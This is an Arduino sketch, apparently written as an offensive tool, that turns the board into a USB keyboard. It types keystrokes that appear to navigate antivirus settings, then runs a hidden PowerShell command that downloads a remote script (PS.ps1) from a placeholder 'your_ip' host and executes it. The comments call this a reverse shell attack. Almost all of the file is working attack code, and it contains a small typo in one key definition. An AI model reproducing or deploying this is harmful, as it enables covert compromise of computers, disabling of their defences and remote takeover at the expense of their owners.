
// This Arduino code is designed to turn the device into a USB keyboard using the HID protocol.
// It automates keystrokes to simulate a reverse shell attack by exploiting keyboard inputs.
// The main goal is to open a PowerShell window and execute a command that downloads and runs a malicious script (PS.ps1).

// Libraries and Definitions:
// The HIDKeyboard library is included to use the Arduino as a keyboard.
// Several key codes are defined to simulate keypresses, such as CTRL, ALT, SHIFT, function keys (F1-F12), etc.

// Global Variables:
// 'keyboard' is the HIDKeyboard object used to interact with the computer as a keyboard.
// 'buf[]' is an 8-byte array that stores keypresses before sending them as input.

// setup():
// - Initializes communication with the keyboard using 'keyboard.begin()'.
// - Simulates pressing the Windows key to open the Start Menu.
// - Types the command "Antivi" (which might be a disguised command to open some application).
// - Simulates pressing the ENTER key to execute the command.
// - Multiple key presses, such as TAB, SPACE, and ENTER, are used to navigate through dialog boxes.
// - After setting up the system to the required state, it simulates ALT + F4 (used to close windows) and Win + R (Run command).
// - The keyboard types a PowerShell command to download and execute a malicious script from an external server (your_ip).
// - The command `powershell -w hidden *IEX(New-Object Net.WebClient).downloadString(...)` is used to run the malicious script in the background without opening a visible window.

// loop():
// - This loop function is empty as all the malicious logic is handled in the 'setup()' function.

// STRING(char *txt):
// - This function simulates typing out a string by converting each character into the corresponding keycode.
// - It handles upper and lower case characters, numbers, and special characters (like '&', '*', '<', '>', etc.).
// - It sends keypresses using the 'Serial.write()' function to the computer, making the Arduino behave like a keyboard.

#include <HIDKeyboard.h>

#define KEY_LEFT_CTRL   0x01
#define KEY_LEFT_SHIFT  0x02
#define KEY_LEFT_ALT    0x04
#define KEY_LEFT_GUI    0x08
#define KEY_RIGHT_CTRL  0x10
#define KEY_RIGHT_SHIFT 0x20
#define KEY_RIGHT_ALT   0x40
#define KEY_RIGHT_GUI   0x80
#define KEY_RIGHT_ARROW 0x4F
#define KEY_LEFT_ARROW  0x50
#define KEY_DOWN_ARROW  0x51
#define KEY_UP_ARROW    0x52
#define KEY_ESC         0x29T
#define KEY_F1          0x3A
#define KEY_F2          0x3B
#define KEY_F3          0x3C
#define KEY_F4          0x3D
#define KEY_F5          0x3E
#define KEY_F6          0x3F
#define KEY_F7          0x40
#define KEY_F8          0x41
#define KEY_F9          0x42
#define KEY_F10         0x43
#define KEY_F11         0x44
#define KEY_F12         0x45
#define KEY_PRTSCR      0x46
#define KEY_SCRLK       0x47
#define KEY_PAUSE       0x48
#define KEY_DEL         0x4C
#define KEY_INS         0x49
#define KEY_END         0x4D
#define KEY_HOME        0x4A
#define KEY_PGDN        0x4E
#define KEY_PGUP        0x4B
#define KEY_BACKSPC     0x2A
#define KEY_TAB         0x2B
#define KEY_ENTER       0x28
#define KEY_SPC         0x2C
#define KEY_MUTE        0x7F
#define KEY_VOL_UP      0x80
#define KEY_VOL_DOWN    0x81
#define KEY_UNDERLINE   0x2D
#define KEY_PLUS        0x2E
#define KEY_NONE 0x37
#define KEY_R 0x15


HIDKeyboard keyboard; // Inicializa el objeto HIDKeyboard

uint8_t buf[8] = { 0 }; /* Keyboard report buffer */ 

void setup() {

keyboard.begin(); // Start communication
delay(200);
delay(10);
keyboard.pressSpecialKey(GUI); // Press the GUI (Windows) key
keyboard.releaseKey(); // Release the GUI key

delay(700); // Wait for the Start Button to open
keyboard.print("Antivi"); // Type "run" followed by a carriage return

delay(1400); // Wait for the run dialog to come up
keyboard.pressSpecialKey(ENTER); // Notice use of pressSpecialKey for ENTER
keyboard.releaseKey();

delay(1400);
keyboard.pressSpecialKey(TAB);//1
keyboard.releaseKey();

delay(700);
keyboard.pressSpecialKey(TAB);//2
keyboard.releaseKey();

delay(700);
keyboard.pressSpecialKey(TAB);//3
keyboard.releaseKey();

delay(700);
keyboard.pressSpecialKey(TAB); //4
keyboard.releaseKey();

delay(1100);
keyboard.pressSpecialKey(ENTER); //
keyboard.releaseKey();

delay(1200);
keyboard.pressKey(' '); // Presiona la tecla de espacio
delay(1000); // Espera un segundo (ajusta el tiempo según sea necesario)
keyboard.releaseKey(); // Suelta la tecla de espacio después de un segundo



delay(700);
keyboard.pressSpecialKey(TAB); //1
keyboard.releaseKey();

delay(1000);
keyboard.pressSpecialKey(TAB); //2
keyboard.releaseKey();

delay(700);
keyboard.pressSpecialKey(ENTER); //
keyboard.releaseKey();

delay(1400);
keyboard.pressSpecialKey(TAB); //1
keyboard.releaseKey();

delay(1400);
keyboard.pressKey(' '); //
keyboard.releaseKey();

delay(1100);
keyboard.pressSpecialKey(TAB); //1
keyboard.releaseKey();

delay(1100);
keyboard.pressKey(' '); //
keyboard.releaseKey();

delay(1100);
keyboard.pressSpecialKey(TAB); //1
keyboard.releaseKey();

delay(700);
keyboard.pressSpecialKey(TAB); //1
keyboard.releaseKey();

delay(700);
keyboard.pressKey(' '); //
keyboard.releaseKey();
delay(700);

 buf[0] = KEY_LEFT_ALT;
 buf[2] = KEY_F4;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);

delay(1000);


 buf[0] = GUI;
 buf[2] = KEY_R;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
    
delay(300);

STRING("powershell -w hidden *IEX(New-Object Net.WebClient).downloadString(\\http;,,your_ip,PS.ps1\\)*");

delay(700);
keyboard.pressSpecialKey(ENTER); //
keyboard.releaseKey();

}

void loop() {

}

void STRING(char *txt) {
    while (*txt) {


      
      if (*txt >= 'a' && *txt <= 'z') {
        buf[2] = *txt - 'a' + 4;
      }
      else if (*txt >= 'A' && *txt <= 'Z') {
        buf[0] = KEY_LEFT_SHIFT;

        buf[2] = *txt - 'A' + 4;
      }
      else if (*txt >= '0' && *txt <= '9') {
        if (*txt == '0') {
          buf[2] = *txt - 9;
        }
        else {
          buf[2] = *txt - 19;
        }
      }
      else if (*txt == ' ') {
        buf[2] = KEY_SPC;
      }
      else if (*txt == '&') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x24;
      }
      else if (*txt == '>') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_NONE;
      }
      else if (*txt == '<') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x36;
      }
      else if (*txt == '|') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x64;
      }
      /*
      else if (*txt == '/') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x14;
      */
      else if (*txt == '\\') {
        buf[2] = 0x34;
      }
      
      else if (*txt == '*') {
        buf[0] = KEY_LEFT_SHIFT; 
        buf[2] = 0x34;
      }
      else if (*txt == ';') {
        buf[0] = KEY_LEFT_SHIFT; 
        buf[2] = 0x33;
      }
      else if (*txt == '(') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x26;
      }
      else if (*txt == ')') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x27;
      }
      else if (*txt == '{') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x24;
      }
      else if (*txt == '}') {
        buf[2] = 0x27;
      }
      else if (*txt == '[') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x25;
      }
      else if (*txt == ']') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x26;
      }
      else if (*txt == '-') {
        buf[2] = 0x2D;
      }
      else if (*txt == '=') {
        buf[2] = 0x2E;
      }
      else if (*txt == '.') {
        buf[2] = 0x37;
      }
      else if (*txt == ',') {
       // buf[2] = 0x36;
       buf[2] = 0x38;
      }
      else if (*txt == '_') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_UNDERLINE;
      }
      else if (*txt == '+') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_PLUS;
      }
      else {
        buf[2] = KEY_NONE;
      }

      Serial.write(buf, 8);   // Send keypress
      buf[0] = 0;
      buf[2] = 0;
      Serial.write(buf, 8);   // Release key
      txt++;
    }
  }
